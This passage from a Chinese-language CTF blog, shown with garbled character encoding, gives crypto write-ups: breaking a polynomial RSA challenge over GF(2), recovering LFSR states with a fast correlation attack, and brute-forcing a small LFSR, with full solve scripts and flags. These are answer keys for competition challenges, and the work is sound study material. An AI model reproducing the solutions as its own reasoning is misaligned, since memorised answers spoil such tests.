class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pubkey <span class="keyword">import</span> P, n, e</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m) &lt;= <span class="number">256</span></span><br><span class="line">    m_int = Integer(m.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    m_poly = P(R.fetch_int(m_int))</span><br><span class="line">    c_poly = <span class="built_in">pow</span>(m_poly, e, n)</span><br><span class="line">    c_int = R(c_poly).integer_representation()</span><br><span class="line">    c = <span class="built_in">format</span>(c_int, <span class="string">&#x27;0256x&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ptext = flag + os.urandom(<span class="number">256</span>-<span class="built_in">len</span>(flag))</span><br><span class="line">    ctext = encrypt(ptext)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ctext)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤šé¡¹å¼ RSA ç®—æ³•ï¼Œgoogle äº†ç›¸å…³è®ºæ–‡ï¼š<a href="http://www.diva-portal.se/smash/get/diva2:823505/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:823505/FULLTEXT01.pdf</a></p><p>è¿™ä¸ªé¢˜æ¯é¡¹éƒ½æ˜¯æ¨¡2çš„ï¼Œæ‰€ä»¥ p = 2ï¼Œç±»ä¼¼äºä¸€èˆ¬çš„ RSA éš¾ç‚¹æ˜¯åˆ†è§£å¤§æ•° Nï¼Œå¤šé¡¹å¼ RSA æ˜¯å¯¹å¤šé¡¹å¼ N è¿›è¡Œå› å¼åˆ†è§£ï¼ˆç³»æ•°æ¨¡ p ï¼‰ã€‚</p><p>æˆ‘é€‰æ‹©ä½¿ç”¨ Mathematica æ¥åˆ†è§£ï¼ˆç®€ç›´ç¥å™¨ï¼Œç”¨è¿™ä¸ªå·¥å…·è§£äº†å¥½å¤šå¯†ç é¢˜â€¦ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Factor[å¤šé¡¹å¼,Modulus-&gt;2]</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° Mathematica ç»™å‡ºäº†ç»“æœï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a36bb49753da5b38.png" alt="image.png"></p><p>ä¸¤ä¸ªå› å¼çš„æœ€é«˜æ¬¡æ•°æ˜¯ 821 å’Œ 1227ï¼Œé‚£ä¹ˆå¯ä»¥è®¡ç®— sï¼ˆå‚ç…§ä¸Šé¢æåˆ°çš„è®ºæ–‡ï¼‰ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-cceb2d14f84f2b6a.png" alt="image.png"></p><blockquote><p>s = (2^821-1) * (2^1227-1)</p></blockquote><p>è¿™ä¸ª s ç±»ä¼¼äºä¸€èˆ¬ RSA ä¸­çš„ n çš„æ¬§æ‹‰å€¼ï¼ˆphiï¼‰ï¼Œç„¶åå°±æ˜¯æ±‚é€†å…ƒ d äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=(<span class="number">2</span>**<span class="number">1227</span><span class="number">-1</span>)*(<span class="number">2</span>**<span class="number">821</span><span class="number">-1</span>)</span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line">d = invert(e,s)</span><br><span class="line"><span class="built_in">print</span> d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">28371355076358206651880108899447906576372266284154280282347957145120170645734899523334978078067679493874344060469168599875633378810644150054152285167807343298071802254581411860744158353096011714907819564399402714709858337654437633205741705120012058022068404602368525225166892620782231104596296684392603977673442420869964883518757302131139464582403543008517510576759631853686083804876647805871645437996963908242523987920166730933950556409136138395339773872530985876082852299816804207673785130661047844641798164979597836577807048385040982943227701240014693785196556609759136982566512240594608088626862145862029373010104</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° d æœ€åå°±æ˜¯è§£å¯†ï¼Œsage è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pubkey <span class="keyword">import</span> P, n, e</span><br><span class="line"></span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line">d = <span class="number">28371355076358206651880108899447906576372266284154280282347957145120170645734899523334978078067679493874344060469168599875633378810644150054152285167807343298071802254581411860744158353096011714907819564399402714709858337654437633205741705120012058022068404602368525225166892620782231104596296684392603977673442420869964883518757302131139464582403543008517510576759631853686083804876647805871645437996963908242523987920166730933950556409136138395339773872530985876082852299816804207673785130661047844641798164979597836577807048385040982943227701240014693785196556609759136982566512240594608088626862145862029373010104</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">c = f.read()</span><br><span class="line"></span><br><span class="line">c_int = <span class="built_in">int</span>(c.encode(<span class="string">&quot;hex&quot;</span>),<span class="number">16</span>)</span><br><span class="line">c_poly = P(R.fetch_int(c_int))</span><br><span class="line">m_poly = <span class="built_in">pow</span>(c_poly, d, n)</span><br><span class="line">m_int = R(m_poly).integer_representation()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(m_int)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">babyrsa$ sage solve.sage</span><br><span class="line">flag&#123;P1ea5e_k33p_N_as_A_inTegeR~~~~~~&#125;jIÆ²â–’â–’</span><br><span class="line">â–’;fâ–’$!$â–’â–’wâ–’uâ–’â–’â–’â–’=[â–’â–’z;â–’<span class="comment">#6uâ–’Lâ–’â–’:â–’Xlâ–’Ú˜â–’â–’Hâ–’M0bâ–’â–’â–’</span></span><br><span class="line">â–’^â–’bâ–’â–’mâ–’â–’â–’â–’â–’dâ–’9â–’â–’Aâ–’ â–’   â–’â–’!â–’</span><br><span class="line">=</span><br><span class="line"> pâ–’â–’â–’pâ–’hâ–’â–’â–’&gt;TÉ–MÃ”â–’â–’â–’Rxâ–’Zâ–’â–’â–’â–’6â–’(â–’arâ–’/^paâ–’â–’â–’ÙŒgâ–’F7Xâ–’â–’Üƒâ–’â–’2â–’â–’â–’â–’â–’rvKn6â–’?:â–’Bâ–’â–’â–’*â–’â–’yâ–’â–’y</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="zer0lfsr"><a href="#zer0lfsr" class="headerlink" title="zer0lfsr"></a>zer0lfsr</h4><p>æ¯”èµ›çš„æ—¶å€™çœ‹åˆ°é¢˜ç›®å°±æƒ³åˆ°äº†å¼ºç½‘æ¯çš„ streamgame3ï¼Œé€šè¿‡å¤šä¸ªçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„çº¿æ€§ç»„åˆæ¥æ„æˆä¸€ä¸ªéçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ã€‚é¦–å…ˆåˆ—ä¸€ä¸‹ x1 x2 x3 å¯¹åº”æœ€åè¾“å‡ºçš„è¡¨ï¼Œå‘ç°x1ï¼Œx2ï¼Œx3 éƒ½æœ‰ 3/4 çš„æ¦‚ç‡ä¸æœ€ç»ˆè¾“å‡ºçš„ç»“æœç›¸åŒã€‚å½“æ—¶çš„ streamgame3 æ¯ä¸ª LFSR æœ€å¤šåªä¸è¿‡ 21 bitï¼Œè¿™æ¬¡çš„ä¸‰ä¸ª LFSR éƒ½æ˜¯ 48 bitï¼Œæ²¡æ³•çˆ†ç ´ï¼ŒGGã€‚</p><p>è¿™ä¸ªé¢˜çš„åé¦ˆä½ï¼ˆæŠ½å¤´ï¼‰éƒ½åªæœ‰ä¸¤ä¸ªï¼Œå¾ˆå°‘ï¼Œæ„Ÿè§‰åº”è¯¥æœ‰ä¸œè¥¿ã€‚google äº†å¾ˆå¤šè®ºæ–‡å‘ç°äº†å½“æŠ½å¤´æ•°è¾ƒå°‘æ—¶å¯ä»¥é‡‡ç”¨<code>å¿«é€Ÿç›¸å…³æ”»å‡»</code>æ¥è¿›è¡Œæ”»å‡»ã€‚æœ€ç»å…¸çš„æ˜¯ Meierå’ŒStaffelbachæå‡ºçš„ç®—æ³•Aå’Œç®—æ³•B ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰¾åˆ°ç›¸åº”çš„å®ç°è„šæœ¬â€¦ è‡ªå·±å•ƒè®ºæ–‡å†™è„šæœ¬å†™ä¸å‡ºï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚</p><p>ä»@iromise å¸ˆå‚…é‚£é‡Œè¦æ¥äº†å¿«é€Ÿç›¸å…³æ”»å‡»çš„å®ç°ï¼š<a href="http://pubs.cs.uct.ac.za/honsproj/cgi-bin/view/2011/desai.zip/crypto_desai/dl/">é“¾æ¥</a></p><p>æŒ‰ç…§ README å®‰è£…å°±å¥½äº†ï¼Œéœ€è¦å®‰è£… GNU Scientific Library ã€‚GSLå®‰è£…å‚è€ƒï¼š<a href="http://www.voidcn.com/article/p-hpwbigec-dd.html">http://www.voidcn.com/article/p-hpwbigec-dd.html</a></p><p>æˆ‘åœ¨å®‰è£…ä¸­ä½¿ç”¨äº† sudo è¿˜æ˜¯å‡ºç°äº†æ²¡æœ‰æƒé™çš„é”™è¯¯ï¼ŒæŠŠæ–‡ä»¶å¤¹ chmod 777 ä¸€ä¸‹ï¼Œmake clean åå†é‡æ–° makeã€‚</p><p>ä½¿ç”¨ï¼šä»¥è¿™é“é¢˜ç¬¬ä¸€ä¸ª lfsr ä¸ºä¾‹ï¼Œè¾“å…¥æ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.75</span><br><span class="line">65536</span><br><span class="line">48</span><br><span class="line">2</span><br><span class="line">23</span><br><span class="line">48</span><br><span class="line">æ¯”ç‰¹æµï¼ˆ65536ä¸ªï¼‰</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œæ˜¯ä¹‹å‰è¯´çš„ 3/4ï¼Œç¬¬äºŒè¡Œæ˜¯æä¾›çš„è¾“å‡ºæ¯”ç‰¹ä¸ªæ•°ï¼Œç¬¬ä¸‰è¡Œæ˜¯ lfsr çŠ¶æ€æ¯”ç‰¹ä½æ•°ï¼Œç¬¬å››è¡Œæ˜¯æŠ½å¤´ä¸ªæ•° nï¼Œåé¢ n è¡Œå°±æ˜¯æŠ½å¤´çš„ä½ç½®ï¼Œæœ€åä¸€è¡Œå°±æ˜¯æä¾›çš„æ¯”ç‰¹æµã€‚</p><p>è¿™ä¸ªé¢˜æœ‰ä¸ªå‘ç‚¹ï¼Œé¢˜ç›®è¾“å‡ºçš„ keystream æ˜¯ utf-8 ç¼–ç çš„ã€‚ã€‚ã€‚æˆ‘ç›´æ¥ python2 <code>open(&quot;keystream&quot;,&quot;rb&quot;).read()</code>å‘ç°ç«Ÿç„¶é•¿åº¦ä¸æ˜¯ 8192â€¦ä¸€è„¸æ‡µé€¼</p><p>æ„Ÿè§‰ python3 çš„ byte ç±»å‹å’Œ utf-8 ç¼–ç ä½¿ç”¨èµ·æ¥å¾ˆéš¾å—ï¼Œå¯èƒ½æ˜¯æ²¡ç”¨æƒ¯çš„åŸå› ã€‚</p><p>å…ˆç”Ÿæˆä¸‰ä¸ªè¾“å…¥æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="built_in">open</span>(<span class="string">&quot;keystream&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">data=data.decode()</span><br><span class="line">init=<span class="string">&#x27;&#x27;&#x27;0.75</span></span><br><span class="line"><span class="string">65536</span></span><br><span class="line"><span class="string">48</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stream=<span class="string">&quot;&quot;</span>.join([ <span class="built_in">bin</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;init1&quot;</span>,<span class="string">&quot;w&quot;</span>).write(init.<span class="built_in">format</span>(<span class="number">23</span>,<span class="number">48</span>)+stream)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;init2&quot;</span>,<span class="string">&quot;w&quot;</span>).write(init.<span class="built_in">format</span>(<span class="number">14</span>,<span class="number">48</span>)+stream)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;init3&quot;</span>,<span class="string">&quot;w&quot;</span>).write(init.<span class="built_in">format</span>(<span class="number">42</span>,<span class="number">48</span>)+stream)</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨å¿«é€Ÿç›¸å…³æ”»å‡»è¿˜åŸæ¯ä¸ª lfsr çš„æ¯”ç‰¹æµï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gml@gml-virtual-machine î‚° ~/CTF/fastcorrattack î‚° src/fca ./zer0lfsr/init1 &gt;./zer0lfsr/result1 </span><br><span class="line">gml@gml-virtual-machine î‚° ~/CTF/fastcorrattack î‚° src/fca ./zer0lfsr/init2 &gt;./zer0lfsr/result2</span><br><span class="line">gml@gml-virtual-machine î‚° ~/CTF/fastcorrattack î‚° src/fca ./zer0lfsr/init3 &gt;./zer0lfsr/result3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ · result1ã€result2ã€result3 ä¸­å°±ä¼šè¿˜åŸå‡ºæ¯ä¸ª lfsr çš„æ¯”ç‰¹æµã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜åŸåˆå§‹çŠ¶æ€ï¼Œè¿™éƒ¨åˆ†ä¸æ‡‚çš„å¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„<a href="http://mmmmmmlei.cn/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/">è¿™ç¯‡</a>ä¸­çš„2018å›½èµ› oldstreamgame</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">mask1=<span class="number">0b100000000000000000000000010000000000000000000000</span></span><br><span class="line">mask2=<span class="number">0b100000000000000000000000000000000010000000000000</span></span><br><span class="line">mask3=<span class="number">0b100000100000000000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR_inv</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    <span class="built_in">str</span>=<span class="built_in">bin</span>(R)[<span class="number">2</span>:].zfill(<span class="number">48</span>)</span><br><span class="line">    new=<span class="built_in">str</span>[<span class="number">-1</span>:]+<span class="built_in">str</span>[:<span class="number">-1</span>]</span><br><span class="line">    new=<span class="built_in">int</span>(new,<span class="number">2</span>)                    <span class="comment">#Rå¾ªç¯å³ç§»ä¸€ä½å¾—åˆ°new</span></span><br><span class="line">    i = (new &amp; mask) &amp; <span class="number">0xffffffffffff</span></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R&gt;&gt;<span class="number">1</span> | lastbit&lt;&lt;<span class="number">47</span></span><br><span class="line"></span><br><span class="line">lfsr1=<span class="built_in">int</span>(<span class="string">&quot;100100011111111010101110010010110100101000110011&quot;</span>,<span class="number">2</span>)</span><br><span class="line">lfsr2=<span class="built_in">int</span>(<span class="string">&quot;001101101101101111001001101101110000001001000011&quot;</span>,<span class="number">2</span>)</span><br><span class="line">lfsr3=<span class="built_in">int</span>(<span class="string">&quot;001000101001101100100001101111101011101010100001&quot;</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    lfsr1=LFSR_inv(lfsr1,mask1)</span><br><span class="line">    lfsr2=LFSR_inv(lfsr2,mask2)</span><br><span class="line">    lfsr3=LFSR_inv(lfsr3,mask3)</span><br><span class="line"></span><br><span class="line">result=<span class="string">b&#x27;&#x27;</span>.join([i.to_bytes(<span class="number">6</span>,<span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> (lfsr1,lfsr2,lfsr3)])</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+ hashlib.sha256(result).hexdigest()+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{b527e2621131134ec22250cfbca75e8c9f5ae4f40370871fd55910927f66a1b4}</p></blockquote><p>æ­¤å¤–ä¹Ÿå¯ä»¥ä½¿ç”¨ z3 çº¦æŸæ±‚è§£ï¼Œè¾ƒä¸ºç®€ä¾¿ã€‚å‚è€ƒï¼š</p><p><a href="https://hxp.io/blog/49/0CTF-Quals-2019-zer0lfsr-writeup/">https://hxp.io/blog/49/0CTF-Quals-2019-zer0lfsr-writeup/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF ä¸­çš„ LFSR</title>
      <link href="/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/"/>
      <url>/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/</url>
      
        <content type="html"><![CDATA[<p>çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆLFSRï¼‰åœ¨æµå¯†ç ä¸­æœ‰å¹¿æ³›çš„åº”ç”¨ï¼Œæ˜¯æŒ‡ç»™å®šå‰ä¸€çŠ¶æ€çš„è¾“å‡ºï¼Œå°†è¯¥è¾“å‡ºçš„çº¿æ€§å‡½æ•°å†ç”¨ä½œè¾“å…¥çš„ç§»ä½å¯„å­˜å™¨ã€‚LFSR ä¸»è¦ç”¨äºç”Ÿæˆä¸€ä¸²éšæœºçš„æ¯”ç‰¹æµï¼Œæ¯”ç‰¹æµå¯ç”¨åšåŠ å¯†æ˜æ–‡çš„å¯†é’¥ã€‚</p><p>LFSR åŸºæœ¬åŸç†å¤§è‡´å°±æ˜¯é€šè¿‡å½“å‰çŠ¶æ€è¿›è¡Œä¸€äº›çº¿æ€§è¿ç®—æ¥ç¡®å®šä¸‹ä¸€çŠ¶æ€ã€‚ä¸æ¸…æ¥šçš„å¯ä»¥å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/33920501">è¿™ç¯‡æ–‡ç« </a>å­¦ä¹ ä¸€ä¸‹æµå¯†ç å’Œ LFSR ã€‚</p><p>æœ€å¼€å§‹æ¥è§¦ LFSR æ˜¯åœ¨å¼ºç½‘æ¯çš„ streamgameï¼Œåæ¥å¯†ç å­¦è¯¾ç¨‹ä¸Šæ¯”è¾ƒè¯¦ç»†å­¦ä¹ äº†æµå¯†ç å’Œ LFSRï¼Œå†åˆ°ä»Šå¹´å›½èµ›åˆèµ›ä¸­çš„ oldstreamï¼Œæœ€è¿‘çš„ X-MAS CTF ä¸­ä¸€é“å¯†ç é¢˜æˆ‘çœ‹åˆ°äº† LFSR çš„ä¸€äº›æ–°ç©æ³•ï¼Œæ€»ç»“ä¸€ä¸‹ã€‚</p><a id="more"></a><h3 id="2018-å¼ºç½‘æ¯-streamgame1"><a href="#2018-å¼ºç½‘æ¯-streamgame1" class="headerlink" title="2018 å¼ºç½‘æ¯ streamgame1"></a>2018 å¼ºç½‘æ¯ streamgame1</h3><p>çœ‹ä¸€ä¸‹é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R=<span class="built_in">int</span>(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">2</span>)</span><br><span class="line">mask    =   <span class="number">0b1010011000100011100</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;ab&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(<span class="built_in">chr</span>(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç° flag æ˜¯ 19 ä½æ¯”ç‰¹æµï¼Œä½œä¸º LFSR çš„åˆå§‹çŠ¶æ€ï¼Œç”Ÿæˆäº† 96 ä¸ªæ¯”ç‰¹å¹¶å†™å…¥äº† key ä¸­ã€‚è¿™é‡Œ 2**19 æ—¶é—´å¤æ‚åº¦å¹¶ä¸å¤§ï¼Œç›´æ¥é‡‡ç”¨æš´åŠ›æšä¸¾çš„æ–¹å¼ï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">key=[<span class="number">85</span>,<span class="number">56</span>,<span class="number">247</span>,<span class="number">66</span>,<span class="number">193</span>,<span class="number">13</span>,<span class="number">178</span>,<span class="number">199</span>,<span class="number">237</span>,<span class="number">224</span>,<span class="number">36</span>,<span class="number">58</span>]</span><br><span class="line">mask=<span class="number">0b1010011000100011100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">    R=k;</span><br><span class="line">    a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            (k, out) = lfsr(k, mask)</span><br><span class="line">            tmp = (tmp &lt;&lt; <span class="number">1</span>) ^ out</span><br><span class="line">        <span class="keyword">if</span>(key[i]!=tmp):</span><br><span class="line">           judge=<span class="number">0</span></span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(judge==<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;flag&#123;&#x27;</span>+<span class="built_in">bin</span>(R)[<span class="number">2</span>:]+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 